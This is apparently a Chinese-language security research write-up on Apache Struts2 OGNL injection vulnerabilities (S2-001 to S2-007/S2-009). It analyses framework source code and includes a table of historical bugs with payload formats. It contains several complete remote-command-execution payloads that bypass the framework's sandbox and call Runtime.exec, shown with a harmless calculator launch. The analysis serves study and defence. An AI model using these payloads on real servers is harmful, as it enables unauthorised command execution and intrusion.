## 漏洞分析

### 简介
Struts2是一个MVC（Model View Controller）框架。如果利用Struts2写一个简单的demo。需要定义一个`Action类 + 视图.jsp + struts.xml`。Action类响应用户请求，视图.jsp文件控制页面上显示的内容。struts.xml匹配Action类和视图.jsp。在jsp的头部加入`<%@ taglib prefix="s" uri="/struts-tags" %>`，用于表明Struts2框架。这样就可以引入很多标签来控制视图。   

常用标签包括：控制标签(`<s:if>, <s:iterator>，控制判断、循环等`)、数据标签(`<s:action>,<s:bean>,<s:property>,<s:set>, <s:url>, <s:a>`)、UI标签(`<s:textfield>, <s:textarea>, <s:select> 代表文本框、字段域、下拉框等页面布局内容`)

Struts2的架构处理请求的流程：`Dispatcher(ActionMapper+FilterDispatcher) -> ActionProxy -> ActionInvocation -> 多个Interceptor -> Action -> Result`。其中ActionProxy的内容是从struts.xml中读取的配置。这个流程属于控制流体系。   

Struts2还有个数据流体系： `ActionContext和ValueStack`。其中ValueStack是ActionContext的一个组成部分。 ActionContext是数据载体，负责数据存储和共享。ValueStack则负责计算，提供了表达式引擎计算的场所。

Struts2漏洞的入口是`OgnlUtil.getValue()`会对表达式进行解析，攻击者可以通过OGNL特性和语法构造恶意表达式。从不同的Interceptor或标签入手最终触发`OgnlUtil.getValue()`。

### Struts2 OGNL语法
Struts2和普通的OGNL有一些不同。Struts中，ValueStack是上下文中的根对象，根据栈结构对其中对象进行排列

对象属性获取，如果多个对象都有blah属性，那么获取位于栈前面的对象。或者根据栈索引获取对象。  
```
species or #animal.species or #animal['species']  // call to animal.getSpecies()
salary or #person.salary or #person['salary'] // call to person.getSalary()
name       // call to animal.getName() because animal is on the top

[0].name   // call to animal.getName()
[1].name   // call to person.getName()
```

静态属性和静态方法的获取。Struts2默认不允许访问静态的，如果要访问需要将常量`struts.ognl.allowStaticMethodAccess`设为true。
```
@some.package.ClassName@FOO_PROPERTY  //访问静态属性
@some.package.ClassName@someMethod()  //访问静态方法
```

括号表达式。`(one)(two)`，one计算完作为根对象对two进行计算。每个括号对应语法树上的一个分支，并从最右边的叶子节点开始解析。
```
(fact)(30H)  // 等价于 #fact(30H)

(expression)(constant)=value  // 执行expression=value
(constant)((expression1)(expression2)) // 先执行expression2 再执行expression1
```

其他内容可参考官方文档: https://commons.apache.org/proper/commons-ognl/language-guide.html

### Struts2历史漏洞

| 漏洞名 | 问题定位 | POC格式 | 影响版本 |
|:----:|:----:|:----:|:----:|
| S2-001 | `<s:textfield>` | `%{#a,#b,...,#c}` | 2.0.0-2.0.8 |
| S2-003, S2-005 | `ParametersInterceptor` | `('\u0023')(bla)(bla)&(a)(('\u0023')(bla))` | 2.0.0-2.1.8.1 |
| S2-009 | `ParametersInterceptor` | `(#a,#b,...,#c)(meh)&z[(name)('meh')]` | 2.0.0-2.3.1.1 |
| S2-007 | `ConversionErrorInterceptor` | `'+(#a,#b,...,#c)+'` | 2.0.0-2.2.3 |
| S2-008 | `CookieInterceptor` | `(#a,#b,...,#c)` | 2.0.0-2.3.1.1 |
| S2-012 | `<result type="redirect">/x.jsp?name=${name}</result>` | `%{#a,#b,...,#c}` | 2.0.0-2.3.14.2 |
| S2-013, S2-014 | `<s:a>,<s:url> & includeParams=all` | `${(#a,#b,...,#c)}` | 2.0.0-2.3.14.1 |
| S2-015 | `<action name="*"><result>{1}.jsp</result></action>` | `${#a,#b,...,#c}` | 2.0.0-2.0.8 |
| S2-016, S2-017 | `"action:", "redirect:" or "redirectAction:` | `${#a,#b,...,#c}` | 2.0.0-2.3.15 |
| S2-019 | `DebuggingInterceptor` | `(#a,#b,...,#c)` | 2.0.0-2.3.15.1 |
| S2-029 | `<s:textfield name="%{xxx}">` | `((#a)(@m)) or (#a,#b...,#c) or (#a,#b...,@m)` | 2.0.0-2.3.24.1 (except 2.3.20.3) |
| S2-032, S2-033, S2-037 | `"method:"` | `#a,#b,...,#c` | 2.3.20-2.3.28 (except 2.3.20.3 、2.3.24.3) |
| S2-045 | `content-type："multipart/form_data"` | `%{(#a).(#b).(#c)}` | 2.3.5-2.3.31 or 2.5-2.5.10 |
| S2-046 | `Content-Disposition / Content-Length` | `%{(#a).(#b).(#c)}` | 2.3.5-2.3.31 or 2.5-2.5.10 |
| S2-052, S2-055 | `ContextTypeInterceptor` | xml/json反序列化payload|  2.1.6-2.3.33 or 2.5-2.5.12 |
| S2-059, S2-061 | `<s:a>,<s:url> & id="%{Name}"` | `%{('a'.(#b).(#c)}` |  2.0.0-2.5.20,S2-061 to 2.5.25 |

### S2-001
漏洞demo如下
```
<s:form action="login">
    <s:textfield name="username" label="username" />
    <s:textfield name="password" label="password" />
    <s:submit></s:submit>
</s:form>
```
表单提交后，调用对应的Action.execute()方法进行处理。在Action处理之前，Struts2先读取表单内容，ParametersInterceptor.doIntercept()将表单中的值放入StackValue中。然后对标签进行处理。doStartTag和doEndTag。在标签处理doEngTag时，会对表单值进行计算
```java
// UIBean
public void evaluateParams() {
    if (this.name != null) {
        name = this.findString(this.name); 
        this.addParameter("name", name);
    }
    ...
    if (name != null) {
        String expr = name;
        if (this.altSyntax()) { //"altSyntax"功能，允许将OGNL表达式插入到文本字符串中进行递归处理
            expr = "%{" + name + "}";
        }
        this.addParameter("nameValue", this.findValue(expr, valueClazz)); 
    }
}
```
name的值如password传入到这个方法中，在`altSyntax`功能开启下会被拼接成`%{password}`进行处理。  
代码中的`this.findString()`实际调用的是`this.findValue()`。最终都会调用`TextParseUtil.translateVariables('%', expr, this.stack);`。代码如下
```java
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) {
    Object result = expression;

    while(true) { // 递归
        int start = expression.indexOf(open + "{"); // 此时的open默认传入`%`， 截取`%{`的位置
	int length = expression.length();
        int x = start + 2; // `%{`后一位的位置
        int count = 1;
	while(start != -1 && x < length && count != 0) {...} // 遇到`{`,count++，遇到`}`,count--。判断表达式`{}`是否闭合
	if (start == -1 || end == -1 || count != 0) { return ...} // 如果不存在`%{`，或者{}没闭合直接返回
	String var = expression.substring(start + 2, end); // 取出`%{}`中的内容
	Object o = stack.findValue(var, asType); // 对`%{}`中的内容进行OGNL计算
    }
}
```
其中`stack.findValue()`即`OgnlValueStack.findValue()`，最终会调用`OgnlUtil.getValue()`，对OGNL进行解析。  
第一轮执行到`stack.findValue()`，取出password的表单传入值，如`%{1+1}`。那么在第二轮递归时，可以满足取`%{`的逻辑，然后再次进入到`stack.findValue()`，这次就是对`%{}`括号内的OGNL进行计算了。


### S2-012
```
<package name="S2-012" extends="struts-default">
	<action name="user" class="com.demo.action.UserAction">
		<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
		<result name="input">/index.jsp</result>
		<result name="success">/index.jsp</result>
	</action>
</package>
```

### S2-003
S2-003的demo写个Action就行。当访问该Action，如`index.action?(xxxx)`时，ParametersInterceptor拦截器会解析参数，将参数通过setParameters()写入到要执行的Action中。
```java
public String intercept(ActionInvocation invocation) throws Exception {
    OgnlContextState.setCreatingNullObjects(contextMap, true); 
    OgnlContextState.setDenyMethodExecution(contextMap, true); // 禁止方法执行，对应属性xwork.MethodAccessor.denyMethodExecution=true
    OgnlContextState.setReportingConversionErrors(contextMap, true);
    ValueStack stack = ac.getValueStack();
    this.setParameters(action, stack, parameters); // setParameters
}

protected void setParameters(Object action, ValueStack stack, Map parameters) {
    Iterator iterator = params.entrySet().iterator();
    while(true) {
        entry = (Entry)iterator.next();
        name = entry.getKey().toString();
        acceptableName = this.acceptableName(name) && (parameterNameAware == null || parameterNameAware.acceptableParameterName(name)); // 对name进行过滤，如果不符合直接return跳出循环
	Object value = entry.getValue();
	stack.setValue(name, value);  // 触发
    }
}
```
此处有两个需要注意的点，(1) ParametersInterceptor默认将`denyMethodExecution`设置为true，在`XWorkMethodAccessor`类调用静态方法前，会先取该属性值进行判断。true禁止了静态方法执行。所以想要执行命令就需要先将这个属性设置为false。
```java
public Object callStaticMethod(Map context, Class aClass, String string, Object[] objects) throws MethodFailedException {
    Boolean exec = (Boolean)context.get("xwork.MethodAccessor.denyMethodExecution");
    boolean e = exec == null ? false : exec;
    return !e ? this.callStaticMethodWithDebugInfo(context, aClass, string, objects) : null; //return super.callStaticMethod(context, aClass, methodName, objects);
}           
```
(2) 其中对name进行过滤没有考虑到编码的问题。OGNL底层支持unicode编码或八进制，也就是说虽然禁止了`#context`这样调用对象，但是可以通过`\u0023context`来绕过。所以在官方漏洞说明中提到的是*绕过ParameterInterceptor内置的对于#使用的保护*。
```java
protected boolean acceptableName(String name) {
    return name.indexOf(61) == -1 && name.indexOf(44) == -1 && name.indexOf(35) == -1 && name.indexOf(58) == -1;
} // 分别对应 `=` `,` `#` `:`
```

可以看到S2-003触发点是`OgnlValueStack.setValue()`，调用到`OgnlUtil.setValue()`时会对name进行`compile()`操作，实际上就是将name转换成对应的数据类型。
```
ASTSequence: "c[0],c[1]..."
ASTMap:  var@ClassName@{key:value} or #var{key:value}
ASTList: {c[0],c[1]}
ASTConst: "" 
ASTAssign: c[0]=c[1]
ASTChain: c[0].c[1]
ASTEval: (c[0])(c[1]) 
ASTKeyValue: key->value
ASTProject: {c[0]}
ASTProperty: [c[0]]
```
S2-003的pyaload形如`('\u0023')(bla)(bla)&(a)(('\u0023')(bla))`，对应的就是ASTEval。那么`OgnlUtil.setValue()`调用的就是`ASTEval.setValueBody()`，代码如下。
```java
protected void setValueBody(OgnlContext context, Object target, Object value) throws OgnlException {
    Object expr = this.children[0].getValue(context, target); // ASTEval.getValueBody()
    Object previousRoot = context.getRoot();
    target = this.children[1].getValue(context, target);
    Node node = expr instanceof Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());
    context.setRoot(target);
    node.setValue(context, target, value);
}
```
它把每个括号内的内容当成一个children，获取对应的值，调用`ASTEval.getValueBody()`，该方法和上述代码极为类似，只是将`node.setValue()`变成了`node.getValue()`。如果此时解析的node是OGNL表达式，那么在`node.getValue()`时就会触发表达式执行。

### S2-005
S2-005是S2-003修复的绕过。先看S2-003的payload
```
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&
('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla)(bla)
```
(1)将denyMethodExecution属性值改为false，(2)调用了静态方法`@java.lang.Runtime@getRuntime()`。两步都是为了调用静态方法。所以S2-003在修复时，也是为了保护静态方法不被调用。  

如果对比S2-003修复前后的`ParametersInterceptor.setParameters()`，会发现多了如下几行代码
```java
ValueStack newStack = this.valueStackFactory.createValueStack(stack); // this.securityMemberAccess = new SecurityMemberAccess(allowStaticMethodAccess);
...
boolean memberAccessStack = newStack instanceof MemberAccessValueStack;
if (memberAccessStack) {
    MemberAccessValueStack accessValueStack = (MemberAccessValueStack)newStack;
    accessValueStack.setAcceptProperties(this.acceptParams); // 设置securityMemberAccess.acceptProperties，为空
    accessValueStack.setExcludeProperties(this.excludeParams); // 设置securityMemberAccess.excludeProperties，包含两个匹配模式dojo\..*和^struts\..*
}
```
首先ValueStack多了一个securityMemberAccess属性，`this.valueStackFactory.createValueStack`时初始化如下。然后在accessValueStack操作中更新了两个属性。
```
allowStaticMethodAccess = false
excludeProperties = {Collections$EmptySet@24303}  size = 0   -> dojo\..*和^struts\..*
acceptProperties = {Collections$EmptySet@24303}  size = 0
allowPrivateAccess = false
allowProtectedAccess = false
allowPackageProtectedAccess = false
```

在静态方法`@java.lang.Runtime@getRuntime()`调用时调用栈如下（大多漏洞调试时都可以将断点打到`SecurityMemberAccess.isAccessible()`方法上）
```
OgnlRuntime.callStaticMethod()
  XWorkMethodAccessor.callStaticMethod()  -> 这步判断xwork.MethodAccessor.denyMethodExecution
    OgnlRuntime.callAppropriateMethod() 
      OgnlRuntime.isMethodAccessible()
        SecurityMemberAccess.isAccessible() -> 这步判断this.allowStaticMethodAccess属性
```

`SecurityMemberAccess.isAccessible()`方法核心判断如下
```java
if (Modifier.isStatic(modifiers) && member instanceof Method && !this.getAllowStaticMethodAccess()) { //allowStaticMethodAccess属性默认为false，进入if中
    allow = false;
}

if (!allow) { // 如果allow为false，就return false。所以需要将allow赋值为true
    return false;
} else {
    return !super.isAccessible(context, target, member, propertyName) ? false : this.isAcceptableProperty(propertyName);
}
```
如果allow被赋值为true就会进入else，走到`isAcceptableProperty()`方法
```
protected boolean isAcceptableProperty(String name) {
    return this.isAccepted(name) && !this.isExcluded(name);
}
```
要求`isAccepted()`返回true并且isExcluded返回false。`isExcluded()`是默认返回false的。所以只需要`isAccepted()`返回true。即`acceptProperties`属性为空
```java
protected boolean isAccepted(String paramName) {
    if (!this.acceptProperties.isEmpty()) {...}
    else { // 如果acceptProperties属性为空，返回true
        return true;
    }
}

protected boolean isExcluded(String paramName) {
    if (!this.excludeProperties.isEmpty()) {
        Iterator i$ = this.excludeProperties.iterator();

        while(i$.hasNext()) {
	    Pattern pattern = (Pattern)i$.next();
    	    Matcher matcher = pattern.matcher(paramName);
 	    if (matcher.matches()) { //  dojo\..*和^struts\..*能匹配到就返回true
	        return true;
	    }
        }
    }

    return false;
}
```
这些防御方式都是SecurityMemberAccess中新加的。想要绕过防御，根据上述调用栈，在将denyMethodExecution设为false的基础上，(1) 设置SecurityMemberAccess的allowStaticMethodAccess属性为true，(2)设置SecurityMemberAccess的excludeProperties属性为空。所以S2-005的payload如下。
```
(a)(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla))&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))&(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla))
```

S2-005在修复时，加强了ParametersInterceptor的`acceptedParamNames`参数名的正则过滤。在加强了`ParametersInterceptor.setParameters()`处理时会先判断是否为acceptableName。用的就是如下的正则匹配来判断
```
acceptedParamNames="[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";
```

### S2-009
S2-009是S2-005的绕过。S2-005的修复方式中加强了对参数名`('`，`\'`的过滤。上述S2-005的payload是当作参数名直接传入的。会被过滤掉。但是如果现在参数名使用name此类正常接受的参数，然后将OGNL作为name的参数值。接着利用`z[(name)('lalala')]`来调用name参数值进行OGNL计算。
```
&name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))(meh)&z[(name)('meh')]=true
```
此处需要注意的是Struts2的取参顺序按照ascii大小来排序。这个payload中有两个参数，`name`和`z[(name)('meh')]`。先要让name成功赋值，再通过`()()`获取name进行计算。那么第二个参数的首字符是要大于n的。


### S2-007
漏洞demo如下
```xml
<validators>
    <field name="age">
        <field-validator type="int">
	    <param name="min">1</param>
	    <param name="max">100</param>
	    <message></message>
        </field-validator>
    </field>
</validators>
```
此漏洞场景是配置了验证规则（xml形式），age的参数值需要为int型。通过文件名`<ActionClassName>-validation.xml`和要验证的Action关联。如果传入字符串型，就会被`ConversionErrorInterceptor`拦截，其拦截逻辑如下
```
public String intercept(ActionInvocation invocation) throws Exception {
    ActionContext invocationContext = invocation.getInvocationContext();
    Map<String, Object> conversionErrors = invocationContext.getConversionErrors();
    ValueStack stack = invocationContext.getValueStack();
    HashMap<Object, Object> fakie = null;
    Iterator i$ = conversionErrors.entrySet().iterator();
    while(i$.hasNext()) {
        ...
        fakie.put(propertyName, this.getOverrideExpr(invocation, value)); // value为age传入的字符串，fakie即为"age"->"'payload'"
    }
    if (fakie != null) {
        invocation.getStack().setExprOverrides(fakie); //  OgnlValueStack.overrides赋值为fakie的值
    }
    return invocation.invoke(); 
```
getOverrideExpr会取出传入的字符串，并用单引号包裹
```
protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
    stack.push(value); // 把传入的value入栈
    var4 = "'" + stack.findValue("top", String.class) + "'"; // 把栈头的元素取出来，并用单引号包裹，即 `payload`
    return var4;
}
```
验证规则匹配到参数类型错误后，会跳转到配置的错误（或跳转）页面，然后Struts2会对jsp页面上的标签进行解析。这部分开始和S2-001非常类似。doEngTag解析标签，执行到`TextParseUtil.translateVariables()`，对age进行值的查询，然后OgnlValueStack.getValue()对值进行OGNL解析
```
private String lookupForOverrides(String expr) {
    if (this.overrides != null && this.overrides.containsKey(expr)) {
        expr = (String)this.overrides.get(expr); // 从OgnlValueStack.overrides取出age对应的值
    }
    return expr;
}
```
payload如下
```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) + '
```
S2-007这里用的高版本2.2.3进行测试，和S2-005用的版本区别在于，多了个`if(name==null)`的判断，name为空，直接返回true。而无需将excludeProperties属性置为空
```
protected boolean isAcceptableProperty(String name) {
    if (name == null) {
        return true;
    } else {
        return this.isAccepted(name) && !this.isExcluded(name);
    }
}
```
S2-007的payload闭合了`getOverrideExpr()`方法中添加的单引号。这样OGNL可以正常解析。修复时在`stack.findValue("top") `后增加了一步转义，先对字符串中的双引号进行转义，然后再用双引号包裹。这样避免了双引号闭合的可能。
```
protected String escape(Object value){
    return "\"" + StringEscapeUtils.escapeJava(String.valueOf(value)) + "\"";
}
```



